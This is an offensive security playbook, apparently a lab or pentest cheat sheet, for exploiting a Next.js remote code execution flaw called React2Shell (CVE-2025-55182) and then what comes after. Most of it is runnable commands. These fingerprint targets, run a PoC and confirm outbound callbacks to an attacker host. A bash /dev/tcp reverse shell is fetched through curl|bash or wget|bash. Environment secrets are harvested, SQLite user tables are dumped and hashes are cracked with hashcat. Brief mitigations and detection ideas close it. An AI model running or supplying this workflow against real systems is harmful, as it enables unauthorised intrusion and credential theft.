## Overview

React2Shell is a remote code execution technique affecting vulnerable React / Next.js applications.

A vulnerable application may allow an attacker to execute system commands in the context of the Node.js application user. This commonly results in a shell as a low-privileged service account such as:

```text
node
www-data
app
nextjs
```

The general methodology is:

```text
Identify a React / Next.js application
↓
Fingerprint framework and exposed headers
↓
Scan for React2Shell indicators
↓
Validate command execution safely
↓
Trigger a reverse shell or controlled callback
↓
Enumerate the application context
↓
Search local app files for credentials or secrets
↓
Use discovered credentials for deeper access
```

---

# When to Suspect React2Shell

Investigate React2Shell when a target exposes:

```text
Next.js
React Server Components
Node.js web application
port 3000
/_next/static/ assets
RSC-related headers
Next.js-specific cache headers
```

Common indicators from HTTP responses:

```text
X-Powered-By: Next.js
Vary: RSC
Vary: Next-Router-State-Tree
Vary: Next-Router-Prefetch
Vary: Next-Router-Segment-Prefetch
x-nextjs-cache
x-nextjs-prerender
/_next/static/
```

Useful first check:

```bash
curl -i http://<target>:3000/
```

Look for:

```text
Next.js headers
React Server Component headers
JavaScript chunks under /_next/static/
HTML generated by a Next.js app
```

---

# Requirements

This technique usually requires:

```text
reachable vulnerable React / Next.js application
working React2Shell exploit or PoC
ability to send crafted HTTP requests
outbound connectivity from target for callbacks or reverse shell
command execution context with enough filesystem/network access to continue enumeration
```

# 3. Automated Vulnerability Scanning

## Nuclei

```bash
nuclei -target http://<target>:<port>/
```

Useful findings:

```text
tech-detect:next.js
CVE-2025-55182
React2Shell
critical React / Next.js RCE
```

> [!important]
> Scanner output is not proof of exploitation. Confirm manually with a safe command before attempting a shell.

# 4. Validate Command Execution

## PoC Pattern

A typical PoC may use a target URL and a command argument.

```bash
python3 CVE-2025-55182.py -t http://<target>:<port>/ -c "<command>"
```

## Safe Validation Command

```bash
python3 CVE-2025-55182.py -t http://<target>:<port>/ -c "id"
```

Successful output may look like:

```text
uid=999(node) gid=988(node) groups=988(node)
```

Interpretation:

```text
RCE confirmed
Commands execute as the application user
```

Other safe validation commands:

```bash
whoami
```

```bash
hostname
```

```bash
pwd
```

> [!tip]
> Use safe commands first. Confirm execution context before sending a reverse shell.

---

# 5. Confirm Outbound Connectivity

Before sending a full shell, test whether the target can reach the attack host.

## Start Listener

```bash
sudo nc -lvnp 80
```

## Trigger Callback

```bash
python3 CVE-2025-55182.py -t http://<target>:<port>/ -c "curl http://<attacker_ip>/test"
```

Expected listener evidence:

```text
GET /test HTTP/1.1
Host: <attacker_ip>
User-Agent: curl
```

If this works, the target can reach the attack host.

---

# 6. Prepare Reverse Shell Payload

## Create Shell Script

```bash
cat > s.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<attacker_ip>/<listener_port> 0>&1
EOF
```

Example:

```bash
cat > s.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.113/9001 0>&1
EOF
```

## Host Payload

```bash
python3 -m http.server 80
```

## Start Shell Listener

```bash
sudo nc -lvnp 9001
```

---

# 7. Trigger Reverse Shell

```bash
python3 CVE-2025-55182.py -t http://<target>:<port>/ -c "curl http://<attacker_ip>/s.sh|bash"
```

Expected shell:

```text
bash: cannot set terminal process group
bash: no job control in this shell
node@target:/path/to/app$
```

Confirm:

```bash
id
```

```bash
whoami
```

# 8. Shell Stabilisation

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background shell:

```text
CTRL+Z
```

Fix local terminal:

```bash
stty raw -echo; fg
```

Set terminal:

```bash
export TERM=xterm
```

# 9. Enumerate Application Context

After landing as the application user, enumerate from the current directory first.

```bash
pwd
ls -la
find . -maxdepth 2 -type f 2>/dev/null
```

Check common app files:

```bash
ls -la package.json package-lock.json yarn.lock pnpm-lock.yaml next.config.* .env* 2>/dev/null
```

Search for secrets:

```bash
grep -RniE "password|passwd|pwd|secret|token|api|key|database|db_|sqlite|jwt|session" . 2>/dev/null
```

Check environment:

```bash
env
```

Look for:

```text
DATABASE_URL
JWT_SECRET
SESSION_SECRET
API_KEY
DB_PASSWORD
NODE_ENV
PORT
```

# 10. Search for Local Databases

Node / Next.js applications may use local database files.

Search:

```bash
find . -type f \( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" \) 2>/dev/null
```

Common filenames:

```text
app.db
database.db
users.db
reactor.db
dev.db
prod.db
```

If `sqlite3` is available:

```bash
which sqlite3
```

List tables:

```bash
sqlite3 <database>.db ".tables"
```

Show schema:

```bash
sqlite3 <database>.db ".schema"
```

Dump database:

```bash
sqlite3 <database>.db .dump
```

Query users:

```bash
sqlite3 <database>.db "select * from users;"
```

# 11. Extract and Crack Hashes

If user hashes are found:

```text
username
hash
role
email
```

Save hashes:

```bash
echo '<hash>' > hash.txt
```

Identify hash type:

```bash
hashid hash.txt
```

or:

```bash
name-that-hash hash.txt
```

Crack likely MD5:

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Example cracked credential format:

```text
engineer:reactor1
```

> [!note]
> A 32-character hex hash is often MD5, but always verify before cracking.


# Practical Decision Tree

## Is there a web service on port 3000?

Check:

```bash
curl -i http://<target>:3000/
```

If Next.js headers are present, continue.

---

## Does scanning identify React2Shell?

Run:

```bash
nuclei -target http://<target>:3000/
```

If a React2Shell / React / Next.js RCE finding appears, validate manually.

---

## Does `id` execute successfully?

Run:

```bash
python3 CVE-2025-55182.py -t http://<target>:3000/ -c "id"
```

If it returns a user context, RCE is confirmed.

---

## Can the target call back?

Test:

```bash
python3 CVE-2025-55182.py -t http://<target>:3000/ -c "curl http://<attacker_ip>/test"
```

If callback works, send a shell.

---

## What should be checked after shell?

Start with:

```text
current directory
application files
.env files
SQLite databases
package files
config files
local users
SSH access
```

# Troubleshooting

## PoC Fails

Check:

```text
target URL includes correct scheme and port
trailing slash requirements
HTTP vs HTTPS
application is actually Next.js
scanner result was not a false positive
PoC dependencies are installed
WAF or proxy is interfering
```

---

## Command Executes but Shell Does Not Connect

Check:

```text
attacker IP
listener port
payload syntax
target outbound filtering
curl or wget availability
HTTP server location
shell script permissions not required when piped to bash
```

Try callback first:

```bash
python3 CVE-2025-55182.py -t http://<target>:<port>/ -c "curl http://<attacker_ip>/test"
```

---

## curl Is Missing

Try `wget`:

```bash
python3 CVE-2025-55182.py -t http://<target>:<port>/ -c "wget -qO- http://<attacker_ip>/s.sh|bash"
```

---

## Bash TCP Shell Fails

Try another reverse shell method:

```bash
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'
```

or stage a payload script with a different shell.

---

## SQLite Output Is Too Large

Use targeted queries:

```bash
sqlite3 <database>.db ".tables"
```

```bash
sqlite3 <database>.db ".schema users"
```

```bash
sqlite3 <database>.db "select username,password,email from users;"
```

# Defensive Notes

## Root Causes

This attack path depends on:

```text
vulnerable React / Next.js dependency
reachable exposed web application
RCE through React2Shell
application user able to read local app data
weak or crackable password hashes
credential reuse into SSH or local accounts
```

## Mitigations

Defensive actions:

```text
patch vulnerable React / Next.js versions
track React Server Component advisories
remove vulnerable dependencies
run Node apps as dedicated least-privileged users
avoid storing local user credentials in app databases
use strong password hashing such as bcrypt, scrypt, or Argon2
use unique passwords between app users and system users
restrict SSH access
restrict outbound traffic from application servers
monitor child process execution from Node
```

## Detection Ideas

Monitor for:

```text
unexpected child processes spawned by node
curl or wget launched by node
bash launched by node
reverse shell patterns
access to SQLite app databases
large database dumps
failed or successful SSH login following web compromise
```

Suspicious process chain:

```text
node / next-server
↓
sh / bash
↓
curl / wget
↓
bash
```

---

# Key Takeaways

- Next.js applications can often be fingerprinted through headers and `/_next/static/` assets.
- React2Shell findings should be validated with safe commands before exploitation.
- A successful RCE commonly lands as the Node.js application user.
- The application directory is a high-value post-exploitation target.
- Local SQLite databases may expose user hashes.
- Cracked application credentials may provide SSH access if passwords are reused.
- Treat the foothold as the start of credential hunting and local enumeration, not the end goal.
